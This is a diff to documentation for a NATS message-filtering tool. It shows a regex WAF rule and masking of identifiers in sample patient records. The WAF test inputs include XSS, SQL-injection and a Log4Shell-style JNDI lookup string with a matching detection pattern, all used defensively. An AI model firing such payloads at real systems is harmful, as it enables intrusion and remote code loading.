@@ -1,8 +1,8 @@
-description: Patchbays that decide what may leave: a WAF for NATS with payload scanning, a p99 outlier gate and flood detection, and de-identification of patient records.
+description: Patchbays that decide what may leave: a WAF for NATS with regex payload scanning, a p99 outlier gate and flood detection, and de-identification of patient records.
 
 # Filtering and privacy
 
-{lede} Most examples reshape a stream. These decide what is allowed through: a WAF for NATS that scans payloads, holds back readings above the rolling p99 and flags a flooding subject, and a patchbay that strips identifiers from patient records before they are forwarded.
+{lede} Most examples reshape a stream. These decide what is allowed through: a WAF for NATS that scans payloads with a regular expression, holds back readings above the rolling p99 and flags a flooding subject, and a patchbay that strips and masks identifiers in patient records before they are forwarded.
 
 ## A WAF for NATS
 
@@ -18,16 +18,21 @@ Rules see a message's subject and payload. They do not see which connection publ
 
 ### Payload scan
 
-The first rule is stateless. [`contains?`](forms.html#strings-and-subjects) is a substring test, `or` stops at the first hit, and `if` sends the message one of two ways. A blocked event is not forwarded and its payload is not repeated: `waf.blocked` carries only the subject it arrived on, so one subscriber sees every block without receiving the content that caused it.
+> **Experimental.** The regex forms used here, `matches?`, `re-capture` and `re-replace`, are new; the forms and pattern syntax may change between releases.
+
+The first rule is stateless. [`matches?`](forms.html#regular-expressions) tests the payload against one case-insensitive pattern, and `if` sends the message one of two ways. The `(?i)` prefix ignores case, `\s+` accepts any run of whitespace between `drop` and `table`, and the three alternatives are a script tag, a `${jndi:` lookup and a table drop. A blocked event is not forwarded and its payload is not repeated: `waf.blocked` carries only the subject it arrived on, so one subscriber sees every block without receiving the content that caused it.
 
 ```soundcheck examples/waf.edn
 in.event.orders|{"note":"leave at the door"}
 in.event.orders|{"note":"<script>alert(1)</script>"}
 in.event.signup|{"name":"Ada"}
 in.event.signup|{"name":"x; DROP TABLE users"}
+in.event.orders|{"note":"<SCRIPT src=x>"}
+in.event.signup|{"name":"x; drop   table users"}
+in.event.orders|{"note":"${jndi:ldap://host/a}"}
 ```
 
-This is plain substring matching: no regular expressions, no decoding and no case folding, so `drop table` in lower case passes. Treat the rule as a cheap first filter, not a full inspection layer.
+The pattern is a string literal, written `#"\s+"` in EDN and `'\s+'` in a `.yml` file. There is no decoding, so a payload that hides `<script` behind URL or HTML escapes passes. Treat the rule as a cheap first filter, not a full inspection layer.
 
 ### Outlier gate
 
@@ -87,17 +92,20 @@ ward.icu.p4471|{"name":"Ada Example","mrn":"000-11-2222","age":47,"hr":72,"spo2"
 ward.icu.p9020|{"name":"Bo Sample","mrn":"000-33-4444","age":81,"hr":90,"spo2":93}
 notes.icu|Comfortable overnight, obs stable
 notes.icu|Call family re MRN 000-11-2222
+notes.icu|Discharge review booked, born 3/4/1980
+notes.icu|MRN 4471, check chart
 ```
 
 What to notice:
 
-- **An allow-list, not a block-list.** [`json-get`](forms.html#json-payloads) reads the fields the rule names. `name` and `mrn` are not removed; they are never read. A field the gateway starts sending next month is left behind too, where a pattern that hunts for identifiers would have to learn about it first. No regular expressions are involved.
+- **An allow-list, not a block-list.** [`json-get`](forms.html#json-payloads) reads the fields the rule names. `name` and `mrn` are not removed; they are never read. A field the gateway starts sending next month is left behind too, where a pattern that hunts for identifiers would have to learn about it first.
 - **The subject is data too.** `ward.icu.p4471` identifies a patient as surely as the name does. The rules publish under `clean.<ward>.…`, so every patient on a ward shares one output subject.
 - **Coarsen what identifies.** [`quantize 10`](forms.html#idempotent-filters) snaps age to the nearest ten. `round` does the same job for coordinates.
 - **Aggregate where a total is enough.** The ward average is a funnel: the first rule is `:reentrant true`, so its `clean.icu.hr` output feeds the `moving-avg` rule.
-- **Free text gets a tripwire.** A note cannot be allow-listed field by field, so the last rule holds any note containing an identifier label and reports only the subject. This is substring matching: it catches `MRN 000-11-2222` and misses a bare number or a name.
+- **Free text gets masked, then checked.** A note cannot be allow-listed field by field. The first notes rule uses [`re-replace`](forms.html#regular-expressions) (an experimental form) to swap a record number shaped like `000-11-2222` for `[MRN]` and a date like `3/4/1980` for `[DATE]`, then hands the masked text to a second rule through `masked.notes.<ward>`. That second rule holds any note that still names `MRN`, `DOB` or `NHS` followed by something the masks did not cover, such as `MRN 4471`, and reports only the subject.
+- **Masking only catches the shapes it is given.** A name, an address, or a record number in another format passes straight through. The allow-list above is still the stronger tool wherever the data has fields.
 
-This is de-identification by omission, not obfuscation. Patchbay has no hashing, tokenising or in-place masking form, so it cannot turn a record number into a stable pseudonym or forward a note with the digits starred out. If downstream needs to follow one patient across messages, issue the pseudonym at the gateway and put it in the subject. Rules like these reduce what leaves the ward; they are not a compliance control by themselves.
+Structured frames are de-identified by omission, not obfuscation. Patchbay has no hashing or tokenising form, so it cannot turn a record number into a stable pseudonym. If downstream needs to follow one patient across messages, issue the pseudonym at the gateway and put it in the subject. Rules like these reduce what leaves the ward; they are not a compliance control by themselves.
 
 ```sh
 examples/deidentify.sh
